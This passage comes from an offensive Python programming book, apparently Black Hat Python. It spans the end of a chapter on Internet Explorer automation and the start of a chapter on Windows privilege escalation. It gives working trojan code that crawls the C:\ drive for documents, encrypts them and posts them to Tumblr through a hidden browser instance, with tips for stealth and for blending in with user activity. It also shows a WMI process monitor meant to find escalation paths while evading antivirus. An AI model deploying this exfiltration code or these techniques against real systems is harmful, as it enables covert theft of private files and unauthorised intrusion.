print "Set text area"
i.focus()
elif i.id == "create_post":
print "Found post button"
post_form = i
i.focus()
# move focus away from the main content box
random_sleep()
u title_box.focus()
random_sleep()
# post the form
post_form.children[0].click()
wait_for_browser(ie)
random_sleep()
return
None of this code should look very new at this point. We are simply
hunting through the DOM to find where to post the title and body of the
blog posting. The post_to_tumblr function only receives an instance of the
browser and the encrypted filename and file contents to post. One little
trick (learned by observing in Chrome developer tools) u is that we have
to shift focus away from the main content part of the post so that Tumblr’s
JavaScript enables the Post button. These subtle little tricks are important
to jot down as you apply this technique to other sites. Now that we can log
in and post to Tumblr, let’s put the finishing touches in place for our script.
def exfiltrate(document_path):
u ie = win32com.client.Dispatch("InternetExplorer.Application")
v ie.Visible = 1
# head to tumblr and login
ie.Navigate("http://www.tumblr.com/login")
wait_for_browser(ie)
132 Chapter 9
print "Logging in..."
login_to_tumblr(ie)
print "Logged in...navigating"
ie.Navigate("https://www.tumblr.com/new/text")
wait_for_browser(ie)
# encrypt the file
title,body = encrypt_post(document_path)
print "Creating new post..."
post_to_tumblr(ie,title,body)
print "Posted!"
# destroy the IE instance
w ie.Quit()
ie = None
return
# main loop for document discovery
# NOTE: no tab for first line of code below
x for parent, directories, filenames in os.walk("C:\\"):
for filename in fnmatch.filter(filenames,"*%s" % doc_type):
document_path = os.path.join(parent,filename)
print "Found: %s" % document_path
exfiltrate(document_path)
raw_input("Continue?")
Our exfiltrate function is what we will call for every document that
we want to store on Tumblr. It first creates a new instance of the Internet
Explorer COM object u—and the neat thing is that you can set the process
to be visible or not v. For debugging, leave it set to 1, but for maximum
stealth you definitely want to set it to 0. This is really useful if, for example,
your trojan detects other activity going on; in that case, you can start exfil-
trating documents, which might help to further blend your activities in with
that of the user. After we call all of our helper functions, we simply kill our IE
instance w and return. The last bit of our script x is responsible for crawling
through the C:\ drive on the target system and attempting to match our pre-
set file extension (.doc in this case). Each time a file is found, we simply pass
the full path of the file off to our exfiltrate function.
Now that we have our main code ready to go, we need to create a quick
and dirty RSA key generation script, as well as a decryption script that we
can use to paste in a chunk of encrypted Tumblr text and retrieve the plain-
text. Let’s start by opening keygen.py and entering the following code:
from Crypto.PublicKey import RSA
new_key = RSA.generate(2048, e=65537)
public_key = new_key.publickey().exportKey("PEM")
private_key = new_key.exportKey("PEM")
Fun with Internet Explorer 133
print public_key
print private_key
That’s right—Python is so bad-ass that we can do it in a handful of
lines of code. This block of code outputs both a private and public key pair.
Copy the public key into your ie_exfil.py script. Then open a new Python file
called decryptor.py and enter the following code (paste the private key into
the private_key variable):
import zlib
import base64
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
private_key = "###PASTE PRIVATE KEY HERE###"
u rsakey = RSA.importKey(private_key)
rsakey = PKCS1_OAEP.new(rsakey)
chunk_size= 256
offset = 0
decrypted = ""
v encrypted = base64.b64decode(encrypted)
while offset  python decryptor.py
C:\Program Files\Debugging Tools for Windows (x86)\dml.doc
#:>
Perfect! My ie_exfil.py script picked up a document from the Windows
Debugging Tools directory, uploaded the contents to Tumblr, and I can
successfully decrypt the file name. Now of course to do the entire con-
tents of the file, you would want to automate it using the tricks I showed
you in Chapter 5 (using urllib2 and HTMLParser), which I will leave as a
homework assignment for you. The other thing to consider is that in our
ie_exfil.py script, we pad the last 256 bytes with the space character, and this
might break certain file formats. Another idea for extending the project is
to encrypt a length field at the beginning of the blog post contents that tells
you the original size of the document before you padded it. You can then
read in this length after decrypting the blog post contents and trim the file
to that exact size.
Fun with Internet Explorer 135
10
winDows Privilege
escal ation
So you’ve popped a box inside a nice juicy Windows
network. Maybe you leveraged a remote heap overflow,
or you phished your way into the network. It’s time to
start looking for ways to escalate privileges. If you’re
already SYSTEM or Administrator, you probably want
several ways of achieving those privileges in case a patch cycle kills your
access. It can also be important to have a catalog of privilege escalations in
your back pocket, as some enterprises run software that may be difficult to
analyze in your own environment, and you may not run into that software
until you’re in an enterprise of the same size or composition. In a typical
privilege escalation, you’re going to exploit a poorly coded driver or native
Windows kernel issue, but if you use a low-quality exploit or there’s a prob-
lem during exploitation, you run the risk of system instability. We’re going
to explore some other means of acquiring elevated privileges on Windows.
System administrators in large enterprises commonly have sched-
uled tasks or services that will execute child processes or run VBScript or
PowerShell scripts to automate tasks. Vendors, too, often have automated,
built-in tasks that behave the same way. We’re going to try to take advan-
tage of high-privilege processes handling files or executing binaries that
are writable by low-privilege users. There are countless ways for you to try
to escalate privileges on Windows, and we are only going to cover a few.
However, when you understand these core concepts, you can expand your
scripts to begin exploring other dark, musty corners of your Windows
targets.
We’ll start by learning how to apply Windows WMI programming to
create a flexible interface that monitors the creation of new processes.
We harvest useful data such as the file paths, the user that created the pro-
cess, and enabled privileges. Our process monitoring then hands off all file
paths to a file-monitoring script that continuously keeps track of any new
files created and what is written to them. This tells us which files are being
accessed by high-privilege processes and the file’s location. The final step
is to intercept the file-creation process so that we can inject scripting code
and have the high-privilege process execute a command shell. The beauty
of this whole process is that it doesn’t involve any API hooking, so we can fly
under most antivirus software’s radar.
installing the Prerequisites
We need to install a few libraries in order to write the tooling in this chap-
ter. If you followed the initial instructions at the beginning of the book,
you’ll have easy_install ready to rock. If not, refer to Chapter 1 for instruc-
tions on installing easy_install.
Execute the following in a cmd.exe shell on your Windows VM:
C:\> easy_install pywin32 wmi
If for some reason this installation method does not work for you,
download the PyWin32 installer directly from http://sourceforge.net/projects/
pywin32/.
Next, you’ll want to install the example service that my tech reviewers
Dan Frisch and Cliff Janzen wrote for me. This service emulates a common
set of vulnerabilities that we’ve uncovered in large enterprise networks and
helps to illustrate the example code in this chapter.
1. Download the zip file from: http://www.nostarch.com/blackhatpython/
bhpservice.zip.
2. Install the service using the provided batch script, install_service.bat.
Make sure you are running as Administrator when doing so.
You should be good to go, so now let’s get on with the fun part!
138 Chapter 10
creating a Process Monitor
I participated in a project for Immunity called El Jefe, which is at its core a
very simple process-monitoring system with centralized logging(http://eljefe
.immunityinc.com/). The tool is designed to be used by people on the defense
side of security to track process creation and the installation of malware.
While consulting one day, my coworker Mark Wuergler suggested that we
use El Jefe as a lightweight mechanism to monitor processes executed as
SYSTEM on our target Windows machines. This would give us insight into
potentially insecure file handling or child process creation. It worked, and
we walked away with numerous privilege escalation bugs that gave us the
keys to the kingdom.
The major drawback of the original El Jefe is that it used a DLL that
was injected into every process to intercept calls to all forms of the native
CreateProcess function. It then used a named pipe to communicate to the
collection client, which then forwarded the details of the process creation
to the logging server. The problem with this is that most antivirus software
also hooks the CreateProcess calls, so either they view you as malware or you
have system instability issues when El Jefe runs side-by-side with antivirus
software. We’ll re-create some of El Jefe’s monitoring capabilities in a hook-
less manner, which also will be geared toward offensive techniques rather
than monitoring. This should make our monitoring portable and give us
the ability to run with antivirus software activated without issue.
Process Monitoring with WMI
The WMI API gives the programmer the ability to monitor the system for cer-
tain events, and then receive callbacks when those events occur. We’re going
to leverage this interface to receive a callback every time a process is created.
When a process gets created, we’re going to trap some valuable information
for our purposes: the time the process was created, the user that spawned
the process, the executable that was launched and its command-line argu-
ments, the process ID, and the parent process ID. This will show us any pro-
cesses that are created by higher-privilege accounts, and in particular, any
processes that are calling external files such as VBScript or batch scripts.
When we have all of this information, we’ll also determine what privileges
are enabled on the process tokens. In certain rare cases, you’ll find pro-
cesses that are created as a regular user but which have been granted addi-
tional Windows privileges that you can leverage.
Let’s begin by creating a very simple monitoring script1 that pro-
vides the basic process information, and then build on that to determine
the enabled privileges. Note that in order to capture information about
1. This code was adapted from the Python WMI page (http://timgolden.me.uk/python/wmi/
tutorial.html).
Windows Privilege Escalation 139
high-privilege processes created by SYSTEM, for example, you’ll need to
run your monitoring script as an Administrator. Let’s get started by adding
the following code to process_monitor.py:
import win32con
import win32api
import win32security
import wmi
import sys
import os
def log_to_file(message):
fd = open("process_monitor_log.csv", "ab")
fd.write("%s\r\n" % message)
fd.close()
return
# create a log file header
log_to_file("Time,User,Executable,CommandLine,PID,Parent PID,Privileges")
# instantiate the WMI interface
u c = wmi.WMI()
# create our process monitor
v process_watcher = c.Win32_Process.watch_for("creation")
while True:
try:
w new_process = process_watcher()
x proc_owner = new_process.GetOwner()
proc_owner = "%s\\%s" % (proc_owner[0],proc_owner[2])
create_date = new_process.CreationDate
executable = new_process.ExecutablePath
cmdline = new_process.CommandLine
pid = new_process.ProcessId
parent_pid = new_process.ParentProcessId
privileges = "N/A"
process_log_message = "%s,%s,%s,%s,%s,%s,%s\r\n" % (create_date, ¬
proc_owner, executable, cmdline, pid, parent_pid, privileges)
print process_log_message
log_to_file(process_log_message)
except:
pass
140 Chapter 10
We start by instantiating the WMI class u and then telling it to watch
for the process creation event v. By reading the Python WMI documenta-
tion, we learn that you can monitor process creation or deletion events. If
you decide that you’d like to closely monitor process events, you can use
the operation and it will notify you of every single event a process goes
through. We then enter a loop, and the loop blocks until process_watcher
returns a new process event w. The new process event is a WMI class called
Win32_Process2 that contains all of the relevant information that we are after.
One of the class functions is GetOwner, which we call x to determine who
spawned the process and from there we collect all of the process informa-
tion we are looking for, output it to the screen, and log it to a file.
Kicking the Tires
Let’s fire up our process monitoring script and then create some processes
to see what the output looks like.
C:\> python process_monitor.py
20130907115227.048683-300,JUSTIN-V2TRL6LD\Administrator,C:\WINDOWS\system32\¬
notepad.exe,"C:\WINDOWS\system32\notepad.exe" ,740,508,N/A
20130907115237.095300-300,JUSTIN-V2TRL6LD\Administrator,C:\WINDOWS\system32\¬
calc.exe,"C:\WINDOWS\system32\calc.exe" ,2920,508,N/A
After running the script, I ran notepad.exe and calc.exe. You can see the
information being output correctly, and notice that both processes had the
Parent PID set to 508, which is the process ID of explorer.exe in my VM. You
could now take an extended break and let this script run for a day and see
all of the processes, scheduled tasks, and various software updaters run-
ning. You might also spot malware if you’re (un)lucky. It’s also useful to log
out and log back in to your target, as events generated from these actions
could indicate privileged processes. Now that we have basic process moni-
toring in place, let’s fill out the privileges field in our logging and learn a
little bit about how Windows privileges work and why they’re important.
windows token Privileges
A Windows token is, per Microsoft: “an object that describes the security
context of a process or thread.”3 How a token is initialized and which
permissions and privileges are set on a token determine which tasks that
process or thread can perform. A well-intentioned developer might have a
system tray application as part of a security product, which they’d like to
give the ability for a non-privileged user to control the main Windows ser-
vice, which is a driver. The developer uses the native Windows API function
2. Win32_Process class documentation: http://msdn.microsoft.com/en-us/library/aa394372(v=vs.85)
.aspx
3. MSDN – Access Tokens: http://msdn.microsoft.com/en-us/library/Aa374909.aspx
Windows Privilege Escalation 141
AdjustTokenPrivileges on the process and innocently enough grants the system
tray application the SeLoadDriver privilege. What the developer is not thinking
about is the fact that if you can climb inside that system tray application, you
too now have the ability to load or unload any driver you want, which means
you can drop a kernel mode rootkit—and that means game over.
Bear in mind, if you can’t run your process monitor as SYSTEM or an
administrative user, then you need to keep an eye on what processes you are
able to monitor, and see if there are any additional privileges you can lever-